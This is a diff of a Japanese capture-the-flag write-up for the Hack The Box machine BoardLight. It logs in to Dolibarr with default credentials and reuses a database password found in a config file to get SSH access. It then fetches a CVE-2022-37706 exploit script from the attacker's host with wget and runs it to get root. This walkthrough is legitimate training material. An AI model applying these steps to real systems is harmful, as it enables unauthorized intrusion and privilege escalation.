@@ -137,6 +137,7 @@ ________________________________________________
 10.10.11.11 crm.board.htb
 ```
 
+アクセスするとログイン画面が出てくる
 
 ![](image-1.png)
 
@@ -144,14 +145,17 @@ ________________________________________________
 
 Dolibarr 17.0.0
 
-admin/admin出は入れた
+admin/adminで入れた
 
 
 ![](image-2.png)
 
 
 
-## PoC
+## CVE-2023-30253_PoC
+
+Dolibarr 17.0.0で検索するとCVE-2023-30253が出てくる
+
 ```
 ┌──(kali㉿kali)-[~/htb/Retired_Machines/BoardLight]
 └─$ git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
@@ -289,6 +293,16 @@ drwxr-xr-x 128 root root 12288 May 17  2024 ..
 -rwxr-xr-x   1 root root   403 Aug  5  2021 update-notifier-common
 ```
 
+```
+larissa@boardlight:/tmp$ dpkg -l | grep enlightenment
+hi  enlightenment                          0.23.1-4                            amd64        X11 window manager based on EFL
+hi  enlightenment-data                     0.23.1-4                            all          X11 window manager based on EFL - run time data files
+```
+ersion of Enlightenment is installed on BoardLight?
+→0.23.1
+
+## CVE-2022-37706
+
 
 ```
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
@@ -346,7 +360,10 @@ $dolibarr_main_distrib='standard';
 
 ## SSHログイン
 
-serverfun2$2023!!
+
+$dolibarr_main_db_pass='serverfun2$2023!!';
+
+`larissa`:`serverfun2$2023!!`
 
 ```
 ┌──(kali㉿kali)-[~/htb/Retired_Machines/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
@@ -366,5 +383,87 @@ uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
 larissa@boardlight:~$ ls
 Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
 larissa@boardlight:~$ cat user.txt 
-9fce8a0fd4fe4ee95507fb06f891a172
+9fc*****************************
 ```
+
+## user.txt 
+`9fc*****************************`
+
+## 権限昇格
+
+
+https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
+これを参考にする
+
+```
+┌──(kali㉿kali)-[~/htb/Retired_Machines/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
+└─$ git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git
+Cloning into 'CVE-2022-37706-LPE-exploit'...
+remote: Enumerating objects: 92, done.
+remote: Counting objects: 100% (92/92), done.
+remote: Compressing objects: 100% (92/92), done.
+remote: Total 92 (delta 32), reused 14 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (92/92), 498.76 KiB | 1.96 MiB/s, done.
+Resolving deltas: 100% (32/32), done.
+```
+
+
+送る
+```
+┌──(kali㉿kali)-[~/…/Retired_Machines/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/CVE-2022-37706-LPE-exploit]
+└─$ python3 -m http.server 8080                                             
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.11.11 - - [09/Apr/2025 00:25:13] "GET /exploit.sh HTTP/1.1" 200 -
+```
+
+
+exploit.sh受信側
+
+```
+larissa@boardlight:/tmp$ wget http://10.xx.xx.xx:8080/exploit.sh
+--2025-04-08 08:25:12--  http://10.xx.xx.xx:8080/exploit.sh
+Connecting to 10.10.14.32:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 709 [text/x-sh]
+Saving to: ‘exploit.sh’
+
+exploit.sh                     100%[=================================================>]     709  --.-KB/s    in 0s      
+
+2025-04-08 08:25:14 (2.90 MB/s) - ‘exploit.sh’ saved [709/709]
+
+larissa@boardlight:/tmp$ ls
+exploit             systemd-private-11c2c412ce364c12a493ea5e87432493-apache2.service-78HUPi
+exploit.sh          systemd-private-11c2c412ce364c12a493ea5e87432493-systemd-logind.service-EN5Zyf
+fakebin             systemd-private-11c2c412ce364c12a493ea5e87432493-systemd-resolved.service-u5W7Ai
+linpeas_output.txt  systemd-private-11c2c412ce364c12a493ea5e87432493-systemd-timesyncd.service-bgSL4e
+linpeas.sh          VMwareDnD
+rootbash            vmware-root_626-2697073973
+```
+
+exploit.sh実行する
+```
+larissa@boardlight:/tmp$ bash exploit.sh
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
+# ls
+';'                   net
+ VMwareDnD            rootbash
+ exploit              systemd-private-11c2c412ce364c12a493ea5e87432493-apache2.service-78HUPi
+ exploit.sh           systemd-private-11c2c412ce364c12a493ea5e87432493-systemd-logind.service-EN5Zyf
+ fakebin              systemd-private-11c2c412ce364c12a493ea5e87432493-systemd-resolved.service-u5W7Ai
+ linpeas.sh           systemd-private-11c2c412ce364c12a493ea5e87432493-systemd-timesyncd.service-bgSL4e
+ linpeas_output.txt   vmware-root_626-2697073973
+# cat /root/root.txt
+568*****************************
+# 
+```
+
+## root.txt
+`568*****************************`
